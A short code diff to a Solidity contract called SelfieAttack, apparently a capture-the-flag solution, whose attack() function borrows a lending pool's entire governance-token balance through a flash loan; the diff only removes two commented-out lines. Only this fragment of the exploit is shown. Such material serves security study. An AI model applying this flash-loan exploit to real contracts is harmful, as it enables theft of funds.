@@ -28,11 +28,8 @@ contract SelfieAttack {
     function attack() external {
         uint256 amount = governanceToken.balanceOf(address(sfPool));
         attacker = tx.origin;
-
-        //governanceToken.approve(address(sfPool), amount);
+        
         sfPool.flashLoan(amount);
-
-        //governanceToken.transfer(tx.origin, governanceToken.balanceOf(address(sfPool)));
     }
 
     function receiveTokens(address, uint256 amount) external payable{
